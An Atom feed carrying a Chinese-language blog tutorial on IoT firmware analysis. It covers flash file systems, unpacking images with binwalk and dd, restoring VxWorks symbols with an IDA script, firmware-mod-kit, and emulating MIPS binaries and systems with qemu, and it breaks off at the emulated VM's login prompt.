<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-09-01T10:41:22.140Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iot固件的一些操作</title>
    <link href="https://nocbtm.github.io/2020/07/06/iot%E5%9B%BA%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://nocbtm.github.io/2020/07/06/iot固件的一些操作/</id>
    <published>2020-07-06T09:46:47.000Z</published>
    <updated>2020-09-01T10:41:22.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会比较通用（前提是需要有实体机设备），因为固件一般都会存储在 PCB 的某个位置里。将设备拆开之后，找到相应的 flash rom 或者 Nor flash，使用专门的工具（烧写器、编程器）进行固件的提取。</p><p>先认识一下flash文件系统和固件类型</p><h2 id="flash文件系统"><a href="#flash文件系统" class="headerlink" title="flash文件系统"></a>flash文件系统</h2><p>与普通计算机系统不同的是，嵌入式系统往往需要使用低成本的存储器，诸如EEPROM（带电可擦可编程只读存储器）或Nor/Nand Flash等。Nand flash存储器经常可以与NOR Flash存储器互换使用。大多数情况下闪存只是用来存储少量的代码，这时NOR闪存更适合一些，而NAND则是高数据存储密度的理想解决方案。</p><p>Reference:<a href="https://www.cnblogs.com/iriczhao/p/12128451.html" target="_blank" rel="noopener">Nand Flash 和Nor Flash的区别详解</a></p><p>这里列举一些最常见的Flash文件系统，具体如下：</p><h3 id="Squashfs"><a href="#Squashfs" class="headerlink" title="Squashfs"></a>Squashfs</h3><p>SquashFS 是一套基于Linux内核使用的压缩只读文件系统，文件最大支持2^64字节。他是基于GPL协议的开源软件。初始的版本使用gzip压缩，2.6.34版本Linux内核增加了支持LZMA和LZO压缩，并且在2.6.3内核版本上增加支持XZ压缩。OpenWrt以及DD-Wrt的固件使用的就是这种文件系统,多见于4～16MB的Nor型Flash中。</p><h3 id="JFFS-JFFS2"><a href="#JFFS-JFFS2" class="headerlink" title="JFFS/JFFS2"></a>JFFS/JFFS2</h3><p>全名是Journalling Flash File System，是RedHat公司开发的闪存文件系统，最早是为NOR Flash设计的，自2.6版本<br>以后开始支持NAND Flash，极适合用于嵌入式系统，多见于32MB以下的Nor型Flash固件中。它支持三种压缩算法：zlib、rubin以及rtime。</p><h3 id="YAFFS-YAFFS2"><a href="#YAFFS-YAFFS2" class="headerlink" title="YAFFS/YAFFS2"></a>YAFFS/YAFFS2</h3><p>全称为Yet Another Flash File System，是由Aleph One公司发展出来的NAND flash嵌入式文件系统。与JFFS不同的<br>是，YAFFS最初是专门针对Nand型Flash所设计的，对于大容量的Flash读写更有优势，而JFFS在小容量的FLASH中更具优势，两者各有侧重。这种文件系统多见于128MB以上的Nand型Flash固件中。</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img alt="image-20200724150957627" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724150957627.png" class="lozad"></p><p><img alt="image-20200724151101485" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724151101485.png" class="lozad"></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件就是程序+文件系统的组合，由文件系统将多个程序组合成一个更大、更复杂的二进制文件。当然这里的大小指的是一个相对的概念。很多时候，固件的大小往往只有几MB，而在Windows或Linux上的可执行文件动辄就是几百MB，当然两者是不能比的，相比而言，固件是麻雀虽小，五脏俱全。</p><p>常见的固件类型，大概可分为如下几种：</p><h3 id="裸机程序"><a href="#裸机程序" class="headerlink" title="裸机程序"></a>裸机程序</h3><p>它是组成最简单的固件，也是最容易分析的固件，IDA可以正确识别并分析这种类型的固件。这类的设备可以看作是 “单片机设备”，设备固件中是比较简单的控制、循环逻辑，利用中断、例程来处理外部世界的各种事件，如常见的智能门锁内部固件</p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p>面向控制，通信领域的实时操作系统（RTOS），如windriver公司的VxWorks、isi的psos、qnx系统软件公司的qnx、ati的nucieus等</p><p>Vxworks镜像分类</p><ul><li>可加载行VxWorks镜像：存储在开发机上，运行在板上RAM中</li><li>基于ROM的VXWorks镜像：存储在板上ROM，运行在板上RAM中</li><li>ROM驻留的VXWorks镜像：存储 在板上ROM，运行在板上ROM中</li></ul><h3 id="非实时操作系统"><a href="#非实时操作系统" class="headerlink" title="非实时操作系统"></a>非实时操作系统</h3><p>面向消费电子产品的非实时操作系统，包括个人数字助理（pad）、移动电话、机顶盒、电子书、webpone等。系统有Microsoft的WinCE，3Com的Palm，以及Symbian和Google的Andrioid等</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>binwak 是一款优秀的固件分析、固件解包工具。可以用来解析绝大多数没有加密的固件，进行解包从而获取到固件的文件系统。</p><p>针对不同的flash文件系统也有不同的工具来解包，比如</p><p>1、Firmware Mod Kit广泛应用于Squashfs类型的固件编辑，支持多款路由器，OpenWrt和DD-Wrt的所有固件，以及TP-Link、ASUS、D-Link的大部分路由型号的固件。</p><p>2、mtd-utils 由于jffs/jffs2和yaffs/yaffs2是基于MTD的文件系统，因此可以使用Linux下的mtd-utils中的内核工具来获得对这两种文件系统的支持</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk通过识别文件头 智能扫描目标文件所有可识别的文件类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file DIR818LW_FW205b03.bin </span><br><span class="line">DIR818LW_FW205b03.bin: data</span><br><span class="line">$ binwalk DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br></pre></td></tr></table></figure><p>提取文件</p><p>“-e” 按照预定义的配置文件中的提取方法提取文件</p><p>“-M” 用于根据magic签名扫描结果进行递归提取</p><p>“-d” 用于限制递归提取深度，默认为8</p><p>“-A “ 使用普通可执行操作码签名扫描目标文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:01</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/DIR818LW_FW205b03.bin</span><br><span class="line">MD5 Checksum:  be061ea71c8714b7c850e0a24291f269</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:08</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/_DIR818LW_FW205b03.bin-0.extracted/78</span><br><span class="line">MD5 Checksum:  55be7263933b41415e8c7c0fb46e614a</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1090373       0x10A345        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">"&amp;0"</span></span><br><span class="line">2934348       0x2CC64C        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">4116512       0x3ED020        Linux kernel version 2.6.30</span><br><span class="line">4153552       0x3F60D0        CRC32 polynomial table, little endian</span><br><span class="line">4653968       0x470390        Neighborly text, <span class="string">"NeighborSolicitstunnel6 init(): can't add protocol"</span></span><br><span class="line">4653988       0x4703A4        Neighborly text, <span class="string">"NeighborAdvertisementst add protocol"</span></span><br><span class="line">4658095       0x4713AF        Neighborly text, <span class="string">"neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span></span><br><span class="line">4673787       0x4750FB        HTML document header</span><br><span class="line">4673950       0x47519E        HTML document footer</span><br></pre></td></tr></table></figure><p>提取出的文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _DIR818LW_FW205b03.bin.extracted/</span><br><span class="line">$ ls</span><br><span class="line">1A0098.squashfs  78  78.7z  squashfs-root</span><br><span class="line">$ <span class="built_in">cd</span> squashfs-root/</span><br><span class="line">$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="加密固件解包"><a href="#加密固件解包" class="headerlink" title="加密固件解包"></a>加密固件解包</h2><h3 id="vxwork"><a href="#vxwork" class="headerlink" title="vxwork"></a>vxwork</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=wdr5620v3.bin of=400.lzma bs=1 skip=1024 count=861326</span><br><span class="line">861326+0 records <span class="keyword">in</span></span><br><span class="line">861326+0 records out</span><br><span class="line">861326 bytes (861 kB, 841 KiB) copied, 1.57047 s, 548 kB/s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>=文件名：输入文件名</span><br><span class="line">of=文件名：输出文件名</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节</span><br><span class="line">count= 读取的字节大小</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lzma -d 400.lzma</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -s 0xc1100 -n 512 -C bin</span><br></pre></td></tr></table></figure><p>提取符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"> </span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span> <span class="comment">#程序名</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"> </span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><h2 id="固件封装"><a href="#固件封装" class="headerlink" title="固件封装"></a>固件封装</h2><p>firmware-mod-kit 工具包可用于提取固件中的文档系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p><p>该工具包支持以下固件：</p><blockquote><p>DD-WRT v23 tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24 tested<br>OpenWrt White Russian tested<br>OpenWrt Kamikaze untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt untested - should work ok<br>HyperWrt untested<br>Ewrt untested<br>Sveasoft Alchemy untested<br>Sveasoft Talisman untested<br>Linksys / other vendor not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G untested - should work ok<br>ASUS WL-520G untested - should work ok<br>ASUS WL-530G supported<br>ASUS WL-550G untested - should work ok<br>Trendnet TEW-632BRP tested<br>DLink DIR-615 untested<br>many others* untested</p></blockquote><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="noopener">google code</a> 下载 Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line"><span class="variable">$cd</span> firmware-mod-kit/src</span><br><span class="line">$./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>firmware-mod-kit 中包含以下几个工具脚本：</p><blockquote><p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文档</p></blockquote><h2 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bmaia/binwall</span><br><span class="line"></span><br><span class="line">python binwally.py dir1 dir2</span><br></pre></td></tr></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>因为例如 MIPS、ARM 指令集是无法直接在 X86 的指令集机器上直接运行的，所以就需要使用一个模拟环境，可以用 qemu或者Firmadyne来模拟</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu有系统模式和用户模式。对于只想模拟单个程序的话使用用户模拟即可；对于整个设备（摄像头、路由器等）的环境来说，使用系统模式比较方便</p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>以 dir645_FW_103.bin 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ wget ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</span><br><span class="line">$ binwalk dir645_FW_103.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/2"</span></span><br><span class="line">112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4237576 bytes</span><br><span class="line">1441904       0x160070        PackImg section delimiter tag, little endian size: 3169792 bytes; big endian size: 6172672 bytes</span><br><span class="line">1441936       0x160090        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6170670 bytes, 2216 inodes, blocksize: 262144 bytes, created: 2012-10-09 10:24:09</span><br><span class="line"></span><br><span class="line">$ binwalk -Me dir645_FW_103.bin </span><br><span class="line">$ ls</span><br><span class="line">dir645_FW_103.bin*  _dir645_FW_103.bin.extracted/</span><br><span class="line">$ file _dir645_FW_103.bin.extracted/squashfs-root/bin/busybox </span><br><span class="line">_dir645_FW_103.bin.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>查看<code>squashfs-root/bin/busybox</code>为mips32 静态链接程序,所以用<code>qemu-mips-static</code>来模拟，启动单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/bin/qemu-mips-static .</span><br><span class="line">$ sudo chroot . ./qemu-mips-static ./sbin/httpd</span><br></pre></td></tr></table></figure><h4 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h4><p>下载不同架构的kernel和文件系统，用来系统模拟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -np -nH -R index.html https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure><p><img alt="image-20200707180834331" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707180834331.png" class="lozad"></p><p>以mips为例</p><p><img alt="image-20200707181153719" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707181153719.png" class="lozad"></p><p>先在物理机添加个虚拟网卡tap0并配置ip，以便和虚拟机进行通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">Set <span class="string">'tap0'</span> persistent and owned by uid 1000</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1273210  bytes 1632037231 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262339  bytes 15789435 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">$ sudo ifconfig tap0 192.168.164.139/24</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1272982  bytes 1632018319 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262111  bytes 15770766 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.139  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::2054:a3ff:fead:808f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 22:54:a3:ad:80:8f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 17  bytes 3330 (3.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 430 (430.0 B)</span><br><span class="line">        TX errors 0  dropped 3 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>需要注意的是配置的tap0的ip要和本地ip在同一个网段，如果配置错误，可以<code>sudo tunctl -d tap0</code>删除重新配置</p><p>然后启动虚拟机，虚拟机默认用户密码为root/root，登录后我们需要配置虚拟机ip地址与tap0也在同一网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Debian GNU/Linux 6.0 debian-mips ttyS0</span><br><span class="line">debian-mips login: 